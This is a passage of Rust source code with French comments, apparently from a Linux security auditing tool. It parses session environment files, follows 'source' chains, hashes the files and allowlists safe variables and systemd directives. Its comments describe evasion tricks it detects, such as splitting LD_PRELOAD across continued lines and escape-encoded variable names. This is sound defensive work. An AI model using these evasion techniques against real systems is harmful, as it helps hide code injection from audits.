    fn de(f: &Path, hypr: bool) -> Variables {
        let nom = f.file_name().and_then(|n| n.to_str()).unwrap_or_default();
        let chemin = f.to_string_lossy();
        if hypr {
            Variables::Hypr
        } else if chemin.contains("/systemd/") && a_l_extension(f, "conf") {
            Variables::Systemd
        } else if chemin.contains("/environment.d/")
            || ["environment", "pam_env.conf", ".pam_environment"].contains(&nom)
        {
            Variables::Cles
        } else {
            Variables::Shell
        }
    }
}

/// Les noms des variables qu'une ligne d'un fichier des variables de la sorte `sorte` pose pour la session, pour
/// les montrer (une affectation sans « export » dans un profil reste dans le shell, et ne se montre pas). Pour
/// l'affichage seulement : ce qui se lie est le fichier entier.
fn noms_poses(l: &str, sorte: Variables) -> Vec<String> {
    let identifiant = |m: &str| {
        let mut o = m.bytes();
        o.next().is_some_and(|p| p.is_ascii_alphabetic() || p == b'_')
            && o.all(|x| x.is_ascii_alphanumeric() || x == b'_')
    };
    let net = l.trim_matches([' ', '\t']);
    let mots: Vec<&str> = net.split([' ', '\t']).filter(|m| !m.is_empty()).collect();
    match sorte {
        Variables::Systemd => ["DefaultEnvironment=", "ManagerEnvironment="]
            .iter()
            .find_map(|c| net.strip_prefix(c))
            .map(|v| {
                v.split([' ', '\t'])
                    .filter_map(|m| m.trim_matches(['"', '\'']).split_once('=').map(|(n, _)| n.to_string()))
                    .collect()
            })
            .unwrap_or_default(),
        Variables::Hypr => net
            .strip_prefix("env")
            .map(|v| v.trim_start_matches([' ', '\t']))
            .and_then(|v| v.strip_prefix('='))
            .map(|v| v.split(',').next().unwrap_or_default().trim_matches([' ', '\t']))
            .filter(|n| identifiant(n))
            .map(|n| vec![n.to_string()])
            .unwrap_or_default(),
        Variables::Cles => match mots.first().copied() {
            Some(premier) => match premier.split_once('=') {
                Some((n, _)) if identifiant(n) => vec![n.to_string()],
                None if identifiant(premier)
                    && mots
                        .get(1)
                        .is_some_and(|m| m.starts_with("DEFAULT=") || m.starts_with("OVERRIDE=")) =>
                {
                    vec![premier.to_string()]
                }
                _ => Vec::new(),
            },
            None => Vec::new(),
        },
        Variables::Shell => match mots.first().copied() {
            Some("set") => {
                let exporte = mots
                    .iter()
                    .any(|m| *m == "--export" || (m.starts_with('-') && !m.starts_with("--") && m.contains('x')));
                match mots.iter().skip(1).find(|m| !m.starts_with('-')) {
                    Some(n) if exporte && identifiant(n) => vec![(*n).to_string()],
                    _ => Vec::new(),
                }
            }
            Some("setenv") => mots
                .get(1)
                .filter(|n| identifiant(n))
                .map(|n| vec![(*n).to_string()])
                .unwrap_or_default(),
            Some(c @ ("export" | "declare" | "typeset")) => {
                if c != "export" && !mots.iter().any(|m| m.starts_with('-') && m.contains('x')) {
                    return Vec::new();
                }
                mots.iter()
                    .skip(1)
                    .filter(|m| !m.starts_with('-'))
                    .map(|m| m.split('=').next().unwrap_or(m))
                    .filter(|n| identifiant(n))
                    .map(str::to_string)
                    .collect()
            }
            _ => Vec::new(),
        },
    }
}

/// L'environnement relevé (ou son refus), les fichiers de Hyprland lus par « source = », et les « source = » non
/// suivis ou à dire (où, ligne, pourquoi).
type Environnement = (
    Result<(String, temoins::Etat), temoins::Refus>,
    Vec<std::path::PathBuf>,
    Vec<(String, String, NonSuivi)>,
);

/// Pourquoi un « source = » de Hyprland se dit (deuxième vérification, N2, N3).
#[derive(Clone, Copy, PartialEq, Eq)]
enum NonSuivi {
    /// Son chemin se calcule (variable, guillemets) : non suivi.
    Calcule,
    /// Un joker dans la partie dossier du chemin : non suivi.
    Joker,
    /// Le fichier inclus est dans un dossier temporaire : suivi, et dit.
    Temporaire,
    /// Au-delà de `SOURCES_MAX` inclusions, ce nombre de fichiers de Hyprland ne sont pas lus.
    Borne(usize),
}

/// Les fichiers qui posent des variables pour les sessions et les services de l'utilisateur : les profils (`profils`),
/// Hyprland (`hypr`), environment.d, les réglages du gestionnaire de systemd (DefaultEnvironment=), pam_env, et
/// chaque fichier qu'ils lisent par un « source » écrit en toutes lettres, à tous les niveaux. Chacun est lié par
/// l'empreinte de son contenu entier : une variable posée là après le choix change ce que fait la ligne acceptée sans
/// toucher à un fichier lié ; liée ainsi, elle fait revenir l'alerte (campagne E, F4 ; vérification, N3). Refusé :
/// une variable de la famille « injection » nommée dans l'un d'eux (`variable_d_injection`, après décodage), dont le
/// fichier ne serait pas lié (deuxième vérification, P1). Le détail montre une ligne par sorte de chose liée : les
/// fichiers, les « source » non suivis, les lignes qui posent une variable hors de la liste sûre, en clair (pas une
/// empreinte par fichier : illisible pour un proche). `Err` : un de ces fichiers ne se lit pas en entier, ou un
/// « source » de Hyprland ne dit pas ce qu'il lit.
fn environnement(r: &Releveur, profils: Vec<std::path::PathBuf>, hypr: Vec<std::path::PathBuf>) -> Environnement {
    let s = |c: &str| r.sous(Path::new(c));
    let m = |c: &str| r.maison.join(c);
    let mut connus = profils;
    for f in [
        "/etc/systemd/user.conf",
        "/etc/systemd/system.conf",
        "/etc/security/pam_env.conf",
    ] {
        connus.push(s(f));
    }
    for d in [
        "/etc/systemd/user.conf.d",
        "/etc/systemd/system.conf.d",
        "/usr/lib/environment.d",
        "/run/environment.d",
    ] {
        connus.extend(fichiers_de(&s(d), &["conf"]));
    }
    connus.push(m(".config/systemd/user.conf"));
    connus.push(m(".pam_environment"));
    connus.extend(fichiers_de(&m(".config/systemd/user.conf.d"), &["conf"]));
    if let Some(c) = &r.config {
        connus.push(r.sous(&c.join("systemd/user.conf")));
        connus.extend(fichiers_de(&r.sous(&c.join("systemd/user.conf.d")), &["conf"]));
        connus.extend(fichiers_de(&r.sous(&c.join("environment.d")), &["conf"]));
    }
    // Chaque fichier, et s'il se lit comme un fichier de Hyprland : celui qui le lit par « source = » le dit, pas
    // son chemin (deuxième vérification de la campagne E).
    let mut sources: Vec<(std::path::PathBuf, bool)> = connus.into_iter().map(|f| (f, false)).collect();
    sources.extend(hypr.into_iter().map(|f| (f, true)));
    sources.sort();
    sources.dedup();
    let connus = sources.len();
    let mut lus: Vec<(String, String)> = Vec::new();
    let mut hypr_lus: Vec<std::path::PathBuf> = Vec::new();
    let mut hypr_non_suivies: Vec<(String, String, NonSuivi)> = Vec::new();
    let mut non_suivies: Vec<String> = Vec::new();
    let mut posees: Vec<String> = Vec::new();
    // Le premier refus l'emporte, mais la lecture continue : les fichiers de Hyprland qu'elle trouve se jugent
    // ensuite (leurs lancements), refus ou non.
    let mut refus: Option<temoins::Refus> = None;
    let mut rang = 0usize;
    while let Some((f, est_hypr)) = sources.get(rang).cloned() {
        rang = rang.saturating_add(1);
        if rang > connus.saturating_add(SOURCES_MAX) {
            refus.get_or_insert(temoins::Refus(trf!(
                "les fichiers des variables des sessions en lisent plus de {SOURCES_MAX} autres : la chaîne ne se suit pas",
                "the session variable files read more than {SOURCES_MAX} others: the chain cannot be followed"
            )));
            // Les fichiers de Hyprland coupés par la borne lanceraient sans être lus : dits, jamais tus (deuxième
            // vérification, N2).
            let coupes = sources
                .get(rang.saturating_sub(1)..)
                .unwrap_or_default()
                .iter()
                .filter(|(_, h)| *h)
                .count();
            if coupes > 0 {
                let premier = sources
                    .get(rang.saturating_sub(1)..)
                    .unwrap_or_default()
                    .iter()
                    .find(|(_, h)| *h)
                    .map(|(c, _)| r.montre(c))
                    .unwrap_or_default();
                hypr_non_suivies.push((premier.clone(), premier, NonSuivi::Borne(coupes)));
            }
            break;
        }
        let montre = crate::ui::affichable(&r.montre(&f));
        let lu = match temoins::lire_borne(&f, LECTURE_MAX) {
            Ok(lu) => lu,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
            Err(e) => {
                refus.get_or_insert(temoins::Refus(trf!(
                    "{montre} ne se lit pas ({e}) : les variables qu'il pose pour les sessions ne se vérifient pas",
                    "{montre} cannot be read ({e}): the variables it sets for sessions cannot be checked"
                )));
                continue;
            }
        };
        if !lu.entier {
            refus.get_or_insert(temoins::Refus(trf!(
                "{montre} ne se lit pas en entier",
                "{montre} cannot be read in full"
            )));
            continue;
        }
        let (Ok(texte), Some(_)) = (std::str::from_utf8(&lu.octets), f.to_str()) else {
            refus.get_or_insert(octet_refuse(&montre));
            continue;
        };
        if lus.iter().any(|(c, _)| *c == r.montre(&f)) {
            continue;
        }
        lus.push((r.montre(&f), temoins::sha256_de(&lu.octets)));
        if est_hypr {
            hypr_lus.push(f.clone());
        }
        let variables = Variables::de(&f, est_hypr);
        let de_root = de_root_seul(&f);
        let injection = |numero: usize, nom: &str| {
            temoins::Refus(trf!(
                "{montre}:{numero} nomme {}, une variable qui fait charger du code à un programme : le fichier qu'elle désigne n'est pas lié",
                "{montre}:{numero} names {}, a variable that makes a program load code: the file it designates is not bound",
                crate::ui::affichable(nom)
            ))
        };
        for (numero, physiques, jointe) in lignes_continuees(texte) {
            let mut vus: Vec<String> = Vec::new();
            for (n, l) in &physiques {
                // Un commentaire (« # » en tête, partout dans ces formats) ne pose rien ; sauf s'il finit par « \ » :
                // une ligne continuée selon le lecteur, gardée.
                let net = l.trim_matches([' ', '\t']);
                if net.starts_with('#') && !net.ends_with('\\') {
                    continue;
                }
                if let Some(nom) = injection_nommee(l, de_root) {
                    refus.get_or_insert(injection(*n, &nom));
                }
                let noms = noms_poses(l, variables);
                if noms.iter().any(|nom| !variable_permise(nom)) {
                    posees.push(format!(
                        "{montre}:{n} : {}",
                        crate::ui::couper(&crate::ui::affichable(net), 90)
                    ));
                }
                vus.extend(noms);
            }
            // Le shell et environment.d joignent « \ » + retour à la ligne suivante sans rien entre les deux : un nom
            // coupé ainsi (« export L\⏎D_PRELOAD=… ») ne se voit que joint (troisième vérification, V1). systemd met
            // une espace : ses mots sont ceux des lignes une à une, déjà lues.
            if physiques.len() > 1 {
                if let Some(nom) = injection_nommee(&jointe, de_root) {
                    refus.get_or_insert(injection(numero, &nom));
                }
                let noms = noms_poses(&jointe, variables);
                if noms.iter().any(|nom| !variable_permise(nom) && !vus.contains(nom)) {
                    posees.push(format!(
                        "{montre}:{numero} : {}",
                        crate::ui::couper(&crate::ui::affichable(jointe.trim_matches([' ', '\t'])), 90)
                    ));
                }
            }
        }
        // Les « source » lus ligne à ligne, et dans le texte aux lignes continuées jointes (« . \⏎~/x ») : le
        // lecteur fait l'un ou l'autre, les deux se suivent.
        let joint = texte_joint(texte);
        let mut suivis = Vec::new();
        for t in [texte, joint.as_str()] {
            let trouvees = sources_lues(r, &f, t, est_hypr, &montre);
            if let Some(x) = trouvees.refus {
                refus.get_or_insert(x);
            }
            suivis.extend(trouvees.suivis);
            if !de_root {
                for (n, ligne, pourquoi) in trouvees.hypr_non_suivies {
                    let dit = (format!("{montre}:{n}"), ligne, pourquoi);
                    if !hypr_non_suivies.contains(&dit) {
                        hypr_non_suivies.push(dit);
                    }
                }
            }
            for n in trouvees.non_suivies {
                let dit = format!("{montre}:{n}");
                if !non_suivies.contains(&dit) {
                    non_suivies.push(dit);
                }
            }
        }
        for suivi in suivis {
            if !sources.iter().any(|(c, _)| *c == suivi) {
                sources.push((suivi, est_hypr));
            }
        }
    }
    if let Some(x) = refus {
        return (Err(x), hypr_lus, hypr_non_suivies);
    }
    lus.sort();
    // Ce qui se lie : chaque fichier et l'empreinte de son contenu entier, sans langue (un choix fait en anglais vaut
    // en français). Ce qui se montre : quelques lignes lisibles, hors de l'empreinte.
    let mut lie = String::new();
    for (chemin, etat) in &lus {
        lie.push_str(chemin);
        lie.push_str(" : ");
        lie.push_str(etat);
        lie.push('\n');
    }
    let mut montre = vec![trf!(
        "{} fichiers de variables liés en entier : {}",
        "{} variable files bound in full: {}",
        lus.len(),
        lus.iter()
            .map(|(c, _)| crate::ui::affichable(c))
            .collect::<Vec<_>>()
            .join(", ")
    )];
    if !non_suivies.is_empty() {
        montre.push(trf!(
            "« source » non suivis (chemin calculé ou relatif ; le fichier qui l'écrit reste lié) : {}",
            "“source” not followed (computed or relative path; the file that writes it stays bound): {}",
            non_suivies.join(", ")
        ));
    }
    if !posees.is_empty() {
        montre.push(trf!(
            "{} lignes posent une variable hors de la liste sûre (écran, langue, fuseau, terminal) :",
            "{} lines set a variable outside the safe list (display, language, time zone, terminal):",
            posees.len()
        ));
        let reste = posees.len().saturating_sub(VARIABLES_MONTREES);
        montre.extend(posees.into_iter().take(VARIABLES_MONTREES));
        if reste > 0 {
            montre.push(trf!("… et {reste} autres", "… and {reste} more"));
        }
    }
    (
        Ok((
            ENVIRONNEMENT.to_string(),
            temoins::Etat::lie_et_montre(lie.as_bytes(), montre),
        )),
        hypr_lus,
        hypr_non_suivies,
    )
}

/// Une ligne logique : le numéro de sa première ligne, chaque ligne physique et son numéro, le texte joint.
type LigneContinuee<'a> = (usize, Vec<(usize, &'a str)>, String);

/// Les lignes logiques d'un fichier des variables, comme les joint un shell : (numéro de la première ligne, chaque
/// ligne physique et son numéro, le texte joint sans rien à la place de « \ » + retour). Une ligne qui finit par
/// « \ » (blancs de fin compris : dans le doute, jointe) se continue sur la suivante.
fn lignes_continuees(texte: &str) -> Vec<LigneContinuee<'_>> {
    lignes_jointes(texte, false)
}

/// `lignes_continuees` comme les lit un shell pour les juger : un commentaire qui commence une ligne logique s'arrête
/// à sa fin de ligne, « \ » compris. Une ligne de préchargement écrite après « # … \ » se voit donc seule.
fn lignes_du_shell(texte: &str) -> Vec<LigneContinuee<'_>> {
    lignes_jointes(texte, true)
}

fn lignes_jointes(texte: &str, commentaire_seul: bool) -> Vec<LigneContinuee<'_>> {
    let mut sortie = Vec::new();
    let mut physiques: Vec<(usize, &str)> = Vec::new();
    let mut jointe = String::new();
    for (n, l) in texte.lines().enumerate() {
        let debut_de_ligne = physiques.is_empty();
        physiques.push((n.saturating_add(1), l));
        let continuee = !(commentaire_seul && debut_de_ligne && commentaire(l));
        if continuee && let Some(debut) = l.trim_end_matches([' ', '\t', '\r']).strip_suffix('\\') {
            jointe.push_str(debut);
        } else {
            jointe.push_str(l);
            let premiere = physiques.first().map_or(1, |(n, _)| *n);
            sortie.push((premiere, std::mem::take(&mut physiques), std::mem::take(&mut jointe)));
        }
    }
    if let Some((premiere, _)) = physiques.first().copied() {
        sortie.push((premiere, physiques, jointe));
    }
    sortie
}

/// Le texte aux lignes continuées jointes, chacune à la place de sa première ligne, suivie d'autant de lignes vides
/// qu'elle en joignait : les numéros des lignes restent ceux du fichier.
fn texte_joint(texte: &str) -> String {
    let mut sortie = String::with_capacity(texte.len());
    for (_, physiques, jointe) in lignes_continuees(texte) {
        sortie.push_str(&jointe);
        sortie.push('\n');
        for _ in 1..physiques.len() {
            sortie.push('\n');
        }
    }
    sortie
}

/// Un fichier que seul root peut changer : lui et chaque dossier de son chemin réel appartiennent à root, sans
/// écriture pour le groupe ni les autres. Un programme du compte, sans root, n'y pose rien.
/// Dans un espace de noms d'utilisateurs (« unshare -r »), le propriétaire 0 vu peut être le compte lui-même : rien
/// n'y est « de root seul ».
fn de_root_seul(f: &Path) -> bool {
    use std::os::unix::fs::MetadataExt as _;
    let carte = std::fs::read_to_string("/proc/self/uid_map").unwrap_or_default();
    if !uid_sans_traduction(&carte) {
        return false;
    }
    let Ok(reel) = std::fs::canonicalize(f) else {
        return false;
    };
    reel.ancestors()
        .all(|a| std::fs::metadata(a).is_ok_and(|m| m.uid() == 0 && m.mode() & 0o022 == 0))
}

/// La carte des identités de ce processus (/proc/self/uid_map) est celle du système, sans traduction : une seule
/// plage, 0 vers 0, sur toutes les identités.
fn uid_sans_traduction(carte: &str) -> bool {
    let lignes: Vec<Vec<&str>> = carte.lines().map(|l| l.split_whitespace().collect()).collect();
    lignes == [vec!["0", "0", "4294967295"]]
}

/// Un motif de nom de fichier (« * », « ? ») comparé à un nom, comme le fait un joker.
fn joker(motif: &[u8], nom: &[u8]) -> bool {
    match (motif.split_first(), nom.split_first()) {
        (None, None) => true,
        (Some((b'*', reste)), _) => joker(reste, nom) || nom.split_first().is_some_and(|(_, n)| joker(motif, n)),
        (Some((b'?', reste)), Some((_, n))) => joker(reste, n),
        (Some((m, reste)), Some((c, n))) if m == c => joker(reste, n),
        _ => false,
    }
}

/// Les fichiers qu'un fichier des variables (son `texte`) lit à son tour, écrits en toutes lettres, et les numéros des lignes
/// dont le « source » ne se suit pas. Hyprland (`hypr`) : « source = … », par un chemin absolu ou sous « ~/ », un
/// joker (« * », « ? ») seulement dans le dernier nom, suivi dans son dossier ; refusé sinon (variable, chemin
/// relatif, accolades), qui lirait on ne sait quoi. Shell : chaque « source » ou « . » en position de commande, même
/// au milieu d'une ligne (« [ -f x ] && . x », « if …; then . x; fi »), par un chemin absolu ou sous « ~/ »,
/// « $HOME/ », guillemets retirés ; un chemin calculé ou relatif ne se suit pas, et se dit dans le détail.
fn sources_lues(r: &Releveur, fichier: &Path, texte: &str, hypr: bool, montre: &str) -> SourcesLues {
    let maison = |reste: &str| r.maison.join(reste);
    let mut refus: Option<temoins::Refus> = None;
    let calcule = |l: &str| {
        temoins::Refus(trf!(
            "{montre} lit « {} », un fichier qui ne se dit pas en toutes lettres : les variables des sessions ne se vérifient pas",
            "{montre} reads “{}”, a file that is not spelled out: the session variables cannot be checked",
            crate::ui::couper(&crate::ui::affichable(l), 80)
        ))
    };
    let mut suivis = Vec::new();
    let mut non_suivies = Vec::new();
    let mut hypr_non_suivies = Vec::new();
    for (n, l) in texte.lines().enumerate() {
        let net = l.trim_matches([' ', '\t']);
        if net.starts_with('#') {
            continue;
        }
        if hypr
            && let Some(v) = net
                .strip_prefix("source")
                .map(|v| v.trim_start_matches([' ', '\t']))
                .and_then(|v| v.strip_prefix('='))
        {
            let v = v.split('#').next().unwrap_or_default().trim_matches([' ', '\t']);
            // Un chemin calculé (variable, guillemets) : ni suivi ni tu (relecture adverse, C7).
            if v.contains(['$', '[', '{', '`', '"', '\'']) || v.is_empty() {
                refus.get_or_insert(calcule(l));
                hypr_non_suivies.push((n.saturating_add(1), net.to_string(), NonSuivi::Calcule));
                continue;
            }
            // Un chemin relatif se lit depuis le dossier du fichier qui l'écrit, comme Hyprland (C7).
            let chemin = if let Some(reste) = v.strip_prefix("~/") {
                maison(reste)
            } else if v.starts_with('/') {
                r.sous(Path::new(&chemin_simplifie(v)))
            } else {
                let dossier = fichier.parent().unwrap_or(Path::new("/"));
                std::path::PathBuf::from(chemin_simplifie(&dossier.join(v).to_string_lossy()))
            };
            let nom = chemin.file_name().and_then(|x| x.to_str()).unwrap_or_default();
            let dossier = chemin.parent().unwrap_or(Path::new("/"));
            // Hyprland développe un joker partout dans le chemin (glob) ; Vanguard, dans le dernier nom seulement : le
            // reste se dit, jamais tu (deuxième vérification, N3).
            if dossier.to_string_lossy().contains(['*', '?']) {
                refus.get_or_insert(calcule(l));
                hypr_non_suivies.push((n.saturating_add(1), net.to_string(), NonSuivi::Joker));
                continue;
            }
            // Un fichier de Hyprland rangé dans un dossier temporaire : lu et jugé, et dit (N3). Un dossier caché du
            // dossier personnel, non : les dépôts de réglages (« ~/.dotfiles ») s'y rangent.
            if temporaire(sans_racine_de_proc(&chemin_simplifie(&r.montre(&chemin)))) {
                hypr_non_suivies.push((n.saturating_add(1), net.to_string(), NonSuivi::Temporaire));
            }
            if nom.contains(['*', '?']) {
                let mut trouves: Vec<std::path::PathBuf> = std::fs::read_dir(dossier)
                    .into_iter()
                    .flatten()
                    .flatten()
                    .filter(|e| {
                        e.file_name()
                            .to_str()
                            .is_some_and(|x| joker(nom.as_bytes(), x.as_bytes()))
                    })
                    .map(|e| e.path())
                    .collect();
                trouves.sort();
                suivis.extend(trouves);
            } else {
                suivis.push(chemin);
            }
            continue;
        }
        // Les mots de la ligne, les séparateurs de commandes à part : « ; », « & », « | », « ( », « ) ».
        let espace: String = net
            .chars()
            .map(|c| {
                if matches!(c, ';' | '&' | '|' | '(' | ')') {
                    ';'
                } else {
                    c
                }
            })
            .collect();
        let espace = espace.replace(';', " ; ");
        let mots: Vec<&str> = espace.split([' ', '\t']).filter(|m| !m.is_empty()).collect();
        let mut commande = true;
        let mut i = 0usize;
        let mut calculee = false;
        while let Some(mot) = mots.get(i).copied() {
            i = i.saturating_add(1);
            if mot == ";" {
                commande = true;
                continue;
            }
            if commande
                && matches!(
                    mot,
                    "then" | "else" | "do" | "if" | "elif" | "while" | "until" | "!" | "{"
                )
            {
                continue;
            }
            if commande && (mot == "." || mot == "source") {
                commande = false;
                let Some(cible) = mots.get(i).copied().filter(|m| *m != ";") else {
                    continue;
                };
                i = i.saturating_add(1);
                let cible: String = cible.chars().filter(|c| !matches!(c, '"' | '\'')).collect();
                let chemin = if let Some(reste) = cible
                    .strip_prefix("~/")
                    .or_else(|| cible.strip_prefix("$HOME/"))
                    .or_else(|| cible.strip_prefix("${HOME}/"))
                {
                    Some(maison(reste))
                } else if cible.starts_with('/') {
                    Some(r.sous(Path::new(&cible)))
                } else {
                    None
                };
                match chemin {
                    Some(c)
                        if !c
                            .to_string_lossy()
                            .contains(['$', '`', '*', '?', '[', '{', '<', '>', '\\']) =>
                    {
                        suivis.push(c);
                    }
                    _ => calculee = true,
                }
                continue;
            }
            commande = false;
        }
        if calculee {
            non_suivies.push(n.saturating_add(1));
        }
    }
    SourcesLues {
        suivis,
        non_suivies,
        hypr_non_suivies,
        refus,
    }
}

/// Ce que `sources_lues` trouve dans un fichier : les fichiers qu'il lit, les numéros des lignes du shell dont le
/// « source » se calcule, les « source = » de Hyprland à dire (numéro, ligne, pourquoi), le premier refus.
struct SourcesLues {
    suivis: Vec<std::path::PathBuf>,
    non_suivies: Vec<usize>,
    hypr_non_suivies: Vec<(usize, String, NonSuivi)>,
    refus: Option<temoins::Refus>,
}

/// L'environnement relevé (`environnement`), à lier à une ligne ; son refus sinon.
fn environnement_lie(r: &Releveur) -> Result<(String, temoins::Etat), temoins::Refus> {
    r.environnement.clone().unwrap_or_else(|| {
        Err(temoins::Refus(
            tr!(
                "les variables des sessions n'ont pas été relevées",
                "the session variables were not recorded"
            )
            .to_string(),
        ))
    })
}

/// Le refus d'un fichier dont le contenu ou le chemin n'est pas de l'UTF-8.
fn octet_refuse(fichier: &str) -> temoins::Refus {
    temoins::Refus(trf!(
        "{fichier} contient un octet qui n'est pas du texte (UTF-8) : ce qui se montre ne serait pas ce qui se lance",
        "{fichier} contains a byte that is not text (UTF-8): what is shown would not be what is started"
    ))
}

/// Au plus autant de fichiers d'ajout (drop-ins) liés pour une unité.
const AJOUTS_MAX: usize = 32;
/// Un fichier d'ajout plus gros n'est pas une configuration.
const AJOUT_MAX: u64 = 1024 * 1024;

/// Les seules directives d'une unité (ou d'un ajout) qui se déclare normale, par section : décrire, ordonner, relancer,
/// borner le temps, la priorité, et les lignes Exec, toutes liées (`lignes_exec`). Toute autre directive (variables
/// lues ailleurs, dossier de travail, racine, dossiers privés ou montés, identifiants, PAM, unité lancée en cas
/// d'échec…) rend la ligne non déclarable : décider par une liste de ce qui est dangereux se contournait à chaque
/// directive oubliée (deuxième vérification de la campagne E, P2) ; on décide par ce qui est sûr.
const DIRECTIVES_PERMISES: [(&str, &[&str]); 3] = [
    (
        "Unit",
        &[
            "Description",
            "Documentation",
            "After",
            "Before",
            // Seulement des cibles (`dependance_permise`) : une cible ne lance rien elle-même.
            "Wants",
            "Requires",
            "PartOf",
            "StartLimitIntervalSec",
            "StartLimitBurst",
        ],
    ),
    (
        "Service",
        &[
            "Type",
            // Le compte qui lance, pas ce qui est lancé (les chemins de la ligne sont absolus et liés) ; et une
            // directive qui ne fait que retirer des droits.
            "User",
            "Group",
            "NoNewPrivileges",
            "ExecStart",
            "ExecStartPre",
            "ExecStartPost",
            "ExecCondition",
            "ExecReload",
            "ExecStop",
            "ExecStopPost",
            "Restart",
            "RestartSec",
            "RemainAfterExit",
            "TimeoutSec",
            "TimeoutStartSec",
            "TimeoutStopSec",
            "Nice",
            // Des noms de `variable_permise` seulement, sans chemin en valeur.
            "Environment",
            "PassEnvironment",
        ],
    ),
    ("Install", &["WantedBy"]),
];

/// Les directives qui lancent une commande : chacune est montrée et liée comme la ligne signalée.
const DIRECTIVES_EXEC: [&str; 7] = [
    "ExecStart",
    "ExecStartPre",
    "ExecStartPost",
    "ExecCondition",
    "ExecReload",
    "ExecStop",
    "ExecStopPost",
];

/// Une dépendance permise (Wants=, Requires=, PartOf=, WantedBy=) : des cibles seulement (« default.target »,
/// « graphical-session.target ») ; une autre unité nommée là serait lancée avec celle-ci, sans être liée.
fn dependance_permise(valeur: &str) -> bool {
    let noms: Vec<&str> = valeur.split([' ', '\t']).filter(|n| !n.is_empty()).collect();
    !noms.is_empty()
        && noms.iter().all(|n| {
            n.strip_suffix(".target")
                .is_some_and(|b| !b.is_empty() && b.bytes().all(|o| o.is_ascii_alphanumeric() || b"-_@.".contains(&o)))
        })
}

/// Les seules variables qu'« Environment= » et « PassEnvironment= » peuvent poser dans une unité qui se déclare
/// normale : l'écran, la langue, le fuseau, le terminal. Aucune ne fait charger du code ni ne change où un programme
/// le cherche. Décider par une liste de ce qui est dangereux se contournait (modules GTK, pilotes GL, BASH_FUNC_…,
/// vérification de la campagne E) : on décide par ce qui est sûr.
fn variable_permise(nom: &str) -> bool {
    const NOMS: [&str; 12] = [
        "DISPLAY",
        "WAYLAND_DISPLAY",
        "LANG",
        "LANGUAGE",
        "TZ",
        "TERM",
        "COLORTERM",
        "NO_COLOR",
        "XDG_SESSION_TYPE",
        "XDG_CURRENT_DESKTOP",
        "XDG_SESSION_DESKTOP",
        "DESKTOP_SESSION",
    ];
    NOMS.contains(&nom)
        || nom
            .strip_prefix("LC_")
            .is_some_and(|r| !r.is_empty() && r.bytes().all(|b| b.is_ascii_uppercase()))
}

/// Les mots d'une valeur de systemd (« Environment= »), coupés sur l'espace et la tabulation hors guillemets,
/// guillemets retirés ; `None` : un échappement (« \ »), que systemd décode (« \x5f » est « _ ») avant de lire le nom
/// (vérification de la campagne E, N3), ou un guillemet non fermé.
fn mots_de_systemd(valeur: &str) -> Option<Vec<String>> {
    if valeur.contains('\\') {
        return None;
    }
    let mut mots = Vec::new();
    let mut mot = String::new();
    let mut dans: Option<char> = None;
    for c in valeur.chars() {
        match (dans, c) {
            (Some(q), c) if c == q => dans = None,
            (None, '"' | '\'') => dans = Some(c),
            (None, ' ' | '\t') => {
                if !mot.is_empty() {
                    mots.push(std::mem::take(&mut mot));
                }
            }
            (_, c) => mot.push(c),
        }
    }
    if dans.is_some() {
        return None;
    }
    if !mot.is_empty() {
        mots.push(mot);
    }
    Some(mots)
}

/// Ce que valent les codes « % » de systemd pour une unité (systemd.unit(5), « Specifiers ») : de l'utilisateur
/// (`maison`, `session` : son XDG_RUNTIME_DIR) ou du système.
struct Codes {
    utilisateur: bool,
    maison: String,
    session: Option<String>,
    /// Les variables posées par « Environment= » dans l'unité : systemd remplace « $A » et « ${A} » des lignes Exec
    /// par leur valeur (relecture adverse 2, N5).
    variables: std::collections::BTreeMap<String, String>,
    /// La sauvegarde que Vanguard pose, si l'unité lue est ce service-là, écrit à l'octet près comme Vanguard l'écrit
    /// (`sauvegarde::sauvegarde_posee`) ; seuls son rsync et son findmnt se taisent, s'ils sont les vrais et si sa
    /// destination se voit sans lien (relecture 0.94, S-1, C-2).
    sauvegarde: Option<crate::sauvegarde::SauvegardePosee>,
}

impl Codes {
    /// Les codes d'une unité du compte (`utilisateur`) ou du système lue sous `r`, sans variables.
    fn de(utilisateur: bool, r: &Releveur) -> Self {
        Self {
            utilisateur,
            maison: r.maison.to_string_lossy().into_owned(),
            session: r.session.as_ref().map(|s| s.to_string_lossy().into_owned()),
            variables: std::collections::BTreeMap::new(),
            sauvegarde: None,
        }
    }
}

/// Les variables qu'une unité (`texte`) pose à ses lignes Exec, ajoutées à `variables` : « Environment= » et
/// « EnvironmentFile= » de ses seules sections `[Service]` et `[Socket]` (vérification 3, P2 : ailleurs, systemd les
/// ignore), leurs codes « % » développés. Une variable posée à deux valeurs différentes (unité et ajouts, ou fichier
/// de variables) vaut `CODE_INCONNU` : ce qu'elle lance ne se connaît pas sans l'ordre exact de systemd.
fn variables_d_unite(
    texte: &str,
    codes: &Codes,
    r: &Releveur,
    variables: &mut std::collections::BTreeMap<String, String>,
) {
    let mut poser = |nom: &str, v: String| {
        let v = match variables.get(nom) {
            Some(avant) if *avant != v => CODE_INCONNU.to_string(),
            _ => v,
        };
        variables.insert(nom.to_string(), v);
    };
    let mut section: Option<String> = None;
    for l in lignes_de_systemd(texte) {
        if let Some(nom) = l.texte.strip_prefix('[').and_then(|x| x.strip_suffix(']')) {
            section = Some(nom.to_string());
            continue;
        }
        if !matches!(section.as_deref(), Some("Service" | "Socket")) {
            continue;
        }
        let Some((cle, valeur)) = l.texte.split_once('=') else {
            continue;
        };
        let Some(valeur) = developper_codes(valeur.trim_matches([' ', '\t']), codes) else {
            continue;
        };
        match cle.trim_matches([' ', '\t']) {
            "Environment" => {
                for mot in commandes_de_systemd_brutes(&valeur).into_iter().flatten().flatten() {
                    if let Some((nom, v)) = affectation(&mot) {
                        poser(nom, v.to_string());
                    }
                }
            }
            "EnvironmentFile" => {
                let chemin = valeur.strip_prefix('-').unwrap_or(&valeur);
                if chemin.starts_with('/')
                    && let Ok(lues) = permise::lire_variables(&r.sous(Path::new(chemin)))
                {
                    for (nom, v) in lues {
                        poser(&nom, v);
                    }
                }
            }
            _ => {}
        }
    }
}

/// Les variables d'une unité du compte fusionnées avec celles de son fichier principal et de ses ajouts
/// (« x.service.d/*.conf ») de tous les dossiers que lit systemd (vérification 3, P8 : un ajout qui change la valeur
/// d'une variable change ce que lance l'unité) ; seulement si une ligne en emploie (« $ »).
fn variables_fusionnees(
    f: &Path,
    texte: &str,
    codes: &Codes,
    r: &Releveur,
) -> std::collections::BTreeMap<String, String> {
    let mut variables = std::collections::BTreeMap::new();
    variables_d_unite(texte, codes, r, &mut variables);
